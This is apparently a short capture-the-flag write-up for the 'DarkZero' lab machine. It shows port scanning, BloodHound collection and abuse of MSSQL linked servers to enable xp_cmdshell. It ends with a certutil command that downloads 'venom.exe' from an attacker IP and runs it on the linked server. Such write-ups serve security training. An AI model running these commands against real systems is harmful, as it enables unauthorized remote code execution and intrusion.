
![](Cover-darkzero.png)

### INFO_

```
Machine Information
As is common in real life pentests, you will start the DarkZero box with credentials for the following account john.w / RFulUtONCOL!
```

```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
2179/tcp open  vmrdp
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```


```
bloodhound-python --domain darkzero.htb --domain-controller dc01.darkzero.htb --nameserver 10.129.3.50 --username john.w --password 'RFulUtONCOL!' --collectionmethod all --dns-tcp --zip
```



### [MSSQL Linked Servers](https://www.adversify.co.uk/blog/escalating-privileges-via-linked-database-servers) 

```
SQL (darkzero\john.w  guest@master)> select srvname from master..sysservers

srvname             
-----------------   
DC01

DC02.darkzero.ext
```



```
EXEC ('EXEC xp_cmdshell "whoami"') AT [DC02.darkzero.ext];


--> The following commands will re enable xp_cmdshell through the two database links we have identified:

EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];

EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];

SQL (darkzero\john.w  guest@master)> EXEC ('xp_cmdshell "whoami"') AT [DC02.darkzero.ext];


output                 
--------------------   
darkzero-ext\svc_sql   

NULL 


--> Upload venom to the host :

EXEC ('xp_cmdshell "certutil.exe -urlcache -f http://10.10.14.40/venom.exe C:\users\svc_sql\Desktop\venom.exe"') AT [DC02.darkzero.ext];

--> Run it :

EXEC ('xp_cmdshell "C:\users\svc_sql\Desktop\venom.exe"') AT [DC02.darkzero.ext];
```
